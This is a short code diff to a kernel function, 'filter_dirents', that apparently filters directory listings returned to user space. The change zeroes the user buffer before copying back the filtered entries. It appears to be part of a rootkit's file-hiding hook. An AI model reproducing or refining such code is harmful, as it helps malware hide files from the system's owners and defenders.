@@ -87,7 +87,13 @@ static notrace long filter_dirents(void __user *user_dir, long n, bool is_64)
         offset += reclen;
     }
 
-    if (copy_to_user(user_dir, filtered_buf, new_offset)) {
+    if (clear_user(user_dir, result)) {
+        kfree(kernel_buf);
+        kfree(filtered_buf);
+        return -EFAULT;
+    }
+
+    if (new_offset > 0 && copy_to_user(user_dir, filtered_buf, new_offset)) {
         kfree(kernel_buf);
         kfree(filtered_buf);
         return -EFAULT;
